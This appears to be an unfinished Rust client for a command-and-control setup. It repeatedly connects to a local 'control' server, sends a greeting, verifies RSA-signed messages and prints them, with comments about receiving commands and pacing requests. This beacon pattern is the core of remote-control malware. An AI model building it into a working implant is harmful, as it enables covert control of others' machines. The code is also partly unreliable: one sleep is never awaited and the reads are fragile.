use tokio::net::{TcpStream};
use rsa::signature::Verifier;
use std::error::Error;
use tokio::time::{Duration, sleep};
use tokio::io::{self, AsyncReadExt, AsyncWriteExt};
use rsa::{RsaPublicKey, Pkcs1v15Encrypt};
use rsa::pkcs1::{DecodeRsaPublicKey};
use rsa::pkcs1v15::{VerifyingKey, Signature};
use rsa::sha2::{Digest, Sha256};


const CONTROL: &str = "127.0.0.1:8080";
const RSA_PUB_PEM: &str = "-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEA3Q4YyAa124SngD/gET8G+2y5tECs0DID/M2TftoLPcnKlfpiZOSP
S2bz9bWA33g0NgE3wGBFtYWevQVMwdU18HR6V5BF1nkmF9JOOHGzcTPXTFHaUKPV
h13+njkQhuEk8y0wNDSz58mEdHAKL/ckyMFl2o1Z5qrAoGO0+v6stUcD/nrrbdvo
sfkJmUo3aVQTy2avtX94h8tp1uLp6aFV/5IvegW3FLAYMbDHkCV8VPzwRVl5mSLQ
IrQKfht+L7Kb7aWTKxcDS+o2oHRIpZWSlE3WvG4xHNp0lhiSJs3i+m0loTquefne
wanT2eKi+DC7sokMR16nvIyJGz0TGISzNQIDAQAB
-----END RSA PUBLIC KEY-----";

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
   // We ideally want to do the following things here
   // 1. Connect to the server if not already connection
   // 2. Send a ping message to the server
   // 3. Recieve command from the control server
   // 4. Sleep to slow down requests
   // Now, we must also decrypt server messages.
   
   let public_key = RsaPublicKey::from_pkcs1_pem(RSA_PUB_PEM).unwrap();
   let verify_key = VerifyingKey::<Sha256>::new(public_key);

    loop {
        let mut stream = get_stream().await;
        let (mut reader, mut writer) = stream.split();
        if let Err(_) = writer.write_all(b"Hello!").await {
            writer.shutdown().await;
            continue;
        }
            
        let mut buf = vec![0u8; 1024];

        // Message
        
        let message_length = match reader.read_exact(&mut buf).await {
            Ok(n) => n,
            Err(_) => {
                writer.shutdown().await;
                continue;
            }
        };

        // Signed Message
        
        let mut signature_buf = vec![0u8; 256];

        if let Err(_) = reader.read(&mut signature_buf).await {
            writer.shutdown().await;
        }

        let signature = Signature::try_from(&signature_buf[..]).expect("Failed to get signature from bytes");

        if let Err(e) = verify_key.verify(&buf[..message_length], &signature) {
            eprintln!("{}", e);
            continue;
        }

        println!("Message from control: {}", String::from_utf8_lossy(&buf[..]));

        writer.shutdown().await;
        
        sleep(Duration::from_millis(5000)).await;
    }
}

async fn get_stream() -> TcpStream {
    loop {
        match TcpStream::connect(CONTROL).await {
            Ok(s) => return s,
            Err(_) => {
                sleep(Duration::from_millis(5000));
            }
        }
    }
}
